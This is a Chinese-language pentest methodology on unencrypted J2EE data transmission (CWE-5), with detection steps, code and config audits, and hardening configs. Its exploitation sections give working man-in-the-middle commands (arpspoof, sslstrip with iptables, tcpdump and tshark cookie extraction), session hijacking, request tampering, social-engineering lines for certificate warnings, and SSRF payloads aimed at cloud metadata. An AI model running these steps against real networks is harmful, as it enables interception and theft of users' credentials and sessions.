# J2EE 数据传输未加密攻击方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对 J2EE 应用数据传输未加密漏洞的检测与利用方法论。该漏洞允许攻击者通过中间人攻击窃取、篡改传输中的敏感数据。

### 1.2 适用范围
- J2EE/Spring Boot Web 应用
- Java 企业应用
- 使用 HTTP 明文传输的系统
- HTTPS 配置不当的应用

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 应用安全工程师
- 网络攻防人员

---

## 第二部分：核心渗透技术专题

### 专题：J2EE 数据传输未加密攻击

#### 2.1 技术介绍

J2EE 数据传输未加密（CWE-5）是指 Java 企业应用在传输敏感数据时未使用加密通道（如 HTTPS），或使用弱加密配置，导致数据可被窃听、篡改。

**漏洞本质：**
- 应用使用 HTTP 而非 HTTPS 传输
- HTTPS 配置不当（弱加密套件、协议版本过低）
- 混合内容（页面 HTTPS 但资源 HTTP）
- 可被降级的 HTTPS 配置

**常见 CWE 映射：**

| CWE 编号 | 描述 |
|---------|------|
| CWE-5 | J2EE Misconfiguration: Data Transmission Without Encryption |
| CWE-319 | 明文传输敏感信息 |
| CWE-311 | 缺少加密保护 |

**风险等级分类：**

| 风险类型 | 描述 | 危害等级 |
|---------|------|---------|
| **HTTP 明文传输** | 所有数据明文传输 | 严重 |
| **HTTPS 降级** | 可被强制降级为 HTTP | 高 |
| **弱加密套件** | 使用已破解的加密算法 | 高 |
| **混合内容** | HTTPS 页面加载 HTTP 资源 | 中 |
| **证书验证缺失** | 不验证服务器证书 | 高 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **登录认证** | 用户名/密码 HTTP 传输 | 凭证明文可被窃取 |
| **会话管理** | Session Cookie HTTP 传输 | 会话可被劫持 |
| **API 调用** | REST API 使用 HTTP | API 数据明文传输 |
| **内部系统** | 内网应用未配置 HTTPS | 内网嗅探攻击 |
| **遗留系统** | 旧系统未升级 HTTPS | 历史债务风险 |
| **微服务通信** | 服务间 HTTP 通信 | 横向移动窃听 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. HTTP/HTTPS 检测**

```bash
# 检查是否支持 HTTPS
curl -I https://target.com

# 检查 HTTP 是否自动跳转 HTTPS
curl -I http://target.com
# 安全：301/302 跳转到 HTTPS
# 危险：200 OK 直接访问

# 检查 HSTS 配置
curl -I https://target.com
# 查找：Strict-Transport-Security 头
```

**2. 混合内容检测**

```bash
# 访问 HTTPS 页面并检查资源
curl https://target.com | grep -E "http://"

# 使用浏览器开发者工具
# Console 标签查看混合内容警告

# 使用 Burp Suite 扫描
# Scanner → 检测混合内容
```

**3. SSL/TLS 配置检测**

```bash
# 使用 nmap 检测 SSL 配置
nmap --script ssl-enum-ciphers -p 443 target.com

# 使用 testssl.sh 全面检测
./testssl.sh target.com

# 使用 openssl 检测
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -tls1_1  # 应失败
openssl s_client -connect target.com:443 -tls1    # 应失败
```

**4. 证书验证检测**

```bash
# 测试自签名证书接受
# 使用 Burp Suite 生成自签名证书
# 如果应用接受，则存在风险

# 测试证书绑定
# 修改 Hosts 文件指向其他 IP
# 如果证书仍有效，则配置不当
```

##### 2.3.2 白盒测试

**1. Java 代码审计**

```java
// ❌ 不安全：HTTP URL
URL url = new URL("http://api.example.com/data");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// ✅ 安全：HTTPS URL
URL url = new URL("https://api.example.com/data");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// ❌ 不安全：禁用证书验证
TrustManager[] trustAll = new TrustManager[] {
    new X509TrustManager() {
        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
        // ... 空实现
    }
};

// ✅ 安全：使用默认证书验证
SSLContext context = SSLContext.getDefault();
```

**2. Spring Boot 配置检查**

```yaml
# ❌ 不安全：application.yml
server:
  port: 8080
  # 无 SSL 配置

# ✅ 安全：application.yml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: password
    key-store-type: PKCS12
```

**3. web.xml 配置检查**

```xml
<!-- ❌ 不安全：无传输保障 -->
<web-app>
    <!-- 无 user-data-constraint -->
</web-app>

<!-- ✅ 安全：强制 HTTPS -->
<web-app>
    <security-constraint>
        <user-data-constraint>
            <transport-guarantee>CONFIDENTIAL</transport-guarantee>
        </user-data-constraint>
    </security-constraint>
</web-app>
```

#### 2.4 漏洞利用方法

##### 2.4.1 网络嗅探攻击

**攻击场景：同一网络环境下的 HTTP 流量窃听**

**利用步骤：**

```bash
# 步骤 1：网络侦察
# 确定目标网络接口
ip addr show

# 步骤 2：启动 Wireshark 抓包
wireshark &
# 或使用 tcpdump
tcpdump -i eth0 -n 'tcp port 80' -w capture.pcap

# 步骤 3：过滤 HTTP 流量
# Wireshark 过滤器：http.request.method == "POST"

# 步骤 4：提取敏感数据
# 查找登录请求
# 查找 Cookie
# 查找 API 令牌
```

**数据提取示例：**

```bash
# 从 pcap 文件提取 POST 数据
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# 提取 Cookie
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# 使用 Burp Suite
# Proxy → HTTP History → 查看明文请求
```

##### 2.4.2 SSL 剥离攻击（HTTPS 降级）

**攻击场景：用户访问 HTTPS 但可被降级为 HTTP**

**利用步骤：**

```bash
# 步骤 1：启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 步骤 2：ARP 欺骗（中间人位置）
arpspoof -i eth0 -t victim gateway
arpspoof -i eth0 -t gateway victim

# 步骤 3：启动 sslstrip
sslstrip -l 8080 -w capture.log -a

# 步骤 4：设置 iptables 重定向
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# 步骤 5：等待用户访问
# 用户访问 http://target.com
# 被 sslstrip 拦截并降级
```

**攻击流程：**

```
用户浏览器
    ↓
访问 https://target.com
    ↓
攻击者拦截（ARP 欺骗）
    ↓
sslstrip 移除 HTTPS 重定向
    ↓
用户访问 http://target.com
    ↓
明文传输凭证/Cookie
    ↓
攻击者窃取数据
```

##### 2.4.3 会话劫持

**攻击场景：窃取 HTTP 传输的 Session Cookie**

**利用步骤：**

```bash
# 步骤 1：从嗅探获取 Cookie
# 从 Wireshark/Burp 获取：
# Set-Cookie: JSESSIONID=ABC123DEF456

# 步骤 2：使用窃取的 Cookie 访问
curl -H "Cookie: JSESSIONID=ABC123DEF456" \
     https://target.com/account

# 步骤 3：Burp Suite 重放
# Proxy → Request → 修改 Cookie
# 发送到 Repeater → 重放请求
```

##### 2.4.4 API 数据篡改

**攻击场景：篡改 HTTP 传输的 API 请求**

**利用步骤：**

```bash
# 步骤 1：拦截 API 请求
# 使用 Burp Suite Proxy 拦截

# 步骤 2：修改请求数据
# 原始请求：
POST /api/transfer HTTP/1.1
{"to": "victim", "amount": 100}

# 修改为：
POST /api/transfer HTTP/1.1
{"to": "attacker", "amount": 10000}

# 步骤 3：转发请求
# 服务器执行篡改后的请求
```

##### 2.4.5 弱加密套件利用

**攻击场景：服务器支持弱加密算法**

**检测方法：**

```bash
# 检测 RC4 支持
openssl s_client -connect target.com:443 -cipher RC4

# 检测 DES 支持
openssl s_client -connect target.com:443 -cipher DES

# 检测 NULL 加密
openssl s_client -connect target.com:443 -cipher NULL

# 检测导出级加密
openssl s_client -connect target.com:443 -cipher EXPORT
```

**利用方法：**

```bash
# 如果支持弱加密，强制使用
# 使用 Burp Suite → SSL 配置
# 选择弱加密套件发起连接

# 使用 F5 攻击（针对特定实现）
# 利用加密降级漏洞
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 HSTS 绕过

| 绕过技术 | 描述 | 条件 |
|---------|------|------|
| **首次访问** | 用户首次访问无 HSTS 缓存 | 无先前访问 |
| **HSTS 过期** | HSTS 缓存过期后 | max-age 过期 |
| **子域名未覆盖** | 未使用 includeSubDomains | 配置不完整 |
| **HTTP 链接诱导** | 页面包含 HTTP 链接 | 混合内容 |
| **SSL 剥离 2.0** | 利用 HSTS 前时间窗口 | 用户未访问过 |

**绕过示例：**

```bash
# 子域名攻击
# target.com 有 HSTS
# 但 sub.target.com 没有

# 诱导用户访问
http://sub.target.com

# 或使用相似域名
http://target.com.attacker.com
```

##### 2.5.2 证书错误绕过

```
攻击者诱导用户：
1. 显示证书错误页面
2. 提示"继续访问（不安全）"
3. 用户点击继续
4. 中间人攻击成功

社会工程学技巧：
- "这是正常的安全提示"
- "点击继续以完成登录"
- 伪造系统警告样式
```

##### 2.5.3 内网 HTTP 服务利用

```bash
# 内网服务通常无 HTTPS
# 利用 SSRF 访问内网

# SSRF Payload
http://internal-service:8080/admin
http://192.168.1.100:80/api
http://169.254.169.254/latest/meta-data/  # AWS 元数据

# 结合 XXE、命令注入等
```

---

## 第三部分：附录

### 3.1 传输加密检测检查清单

```
□ HTTP 是否自动跳转 HTTPS
□ 是否配置 HSTS 响应头
□ HSTS 是否包含 includeSubDomains
□ HSTS max-age 是否合理（≥31536000）
□ 是否使用强加密套件（TLS 1.2+）
□ 是否禁用 TLS 1.0/1.1
□ 是否禁用弱加密（RC4、DES、3DES）
□ 证书是否有效且受信任
□ 是否存在混合内容
□ API 接口是否使用 HTTPS
□ 内部服务通信是否加密
□ Cookie 是否设置 Secure 标志
```

### 3.2 安全配置示例

**Spring Boot HTTPS 配置：**

```yaml
# application.yml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEY_PASSWORD}
    key-store-type: PKCS12
    key-alias: tomcat

# 强制 HTTPS 重定向
@Configuration
public class SecurityConfig {
    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();
        factory.addConnectorCustomizers(connector -> {
            connector.setSecure(true);
            connector.setScheme("https");
        });
        return factory;
    }
}
```

**web.xml 强制 HTTPS：**

```xml
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Protected Context</web-resource-name>
        <url-pattern>/*</url-pattern>
    </web-resource-collection>
    <user-data-constraint>
        <transport-guarantee>CONFIDENTIAL</transport-guarantee>
    </user-data-constraint>
</security-constraint>
```

**Nginx HTTPS 配置：**

```nginx
server {
    listen 443 ssl http2;
    server_name target.com;

    ssl_certificate /etc/ssl/certs/target.crt;
    ssl_certificate_key /etc/ssl/private/target.key;

    # 强加密配置
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;

    # HSTS
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # 混合内容防护
    add_header Content-Security-Policy "upgrade-insecure-requests" always;
}

# HTTP 强制跳转
server {
    listen 80;
    server_name target.com;
    return 301 https://$server_name$request_uri;
}
```

### 3.3 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Wireshark** | 网络抓包分析 | GUI 界面 |
| **tcpdump** | 命令行抓包 | `tcpdump -i eth0 -n 'tcp port 80'` |
| **sslstrip** | HTTPS 降级攻击 | `sslstrip -l 8080 -w capture.log` |
| **testssl.sh** | SSL/TLS 检测 | `./testssl.sh target.com` |
| **nmap** | SSL 配置扫描 | `nmap --script ssl-enum-ciphers -p 443 target` |
| **Burp Suite** | Web 代理/扫描 | Proxy + Scanner 模块 |
| **arpspoof** | ARP 欺骗 | `arpspoof -i eth0 -t victim gateway` |

### 3.4 修复建议

- [ ] **强制 HTTPS** - 所有流量通过 HTTPS 传输
- [ ] **配置 HSTS** - 设置合理的 max-age 和 includeSubDomains
- [ ] **使用强加密** - TLS 1.2+，禁用弱加密套件
- [ ] **HTTP 自动跳转** - 80 端口 301 跳转到 443
- [ ] **Cookie Secure** - 所有 Cookie 设置 Secure 标志
- [ ] **混合内容修复** - 所有资源使用 HTTPS
- [ ] **证书管理** - 使用受信任 CA 证书，定期更新
- [ ] **内网加密** - 内部服务通信也使用加密
- [ ] **API 保护** - API 接口强制 HTTPS
- [ ] **监控告警** - 监控 HTTP 访问尝试

---

**参考资源：**
- [CWE-5: J2EE Misconfiguration: Data Transmission Without Encryption](https://cwe.mitre.org/data/definitions/5.html)
- [OWASP Transport Layer Protection](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP HSTS](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
- [SSL/TLS Deployment Best Practices](https://wiki.mozilla.org/Security/Server_Side_TLS)
